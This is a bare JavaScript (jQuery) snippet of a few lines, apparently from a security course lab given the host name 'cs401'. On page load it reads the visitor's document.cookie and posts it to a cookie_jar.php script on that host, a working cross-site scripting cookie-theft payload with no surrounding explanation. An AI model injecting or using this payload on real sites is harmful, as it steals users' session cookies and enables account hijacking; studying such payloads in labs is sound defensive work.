$(function() {
  var cookies = document.cookie;
  $.post("http://cs401/cookie_jar.php", { cookies: cookies });
});
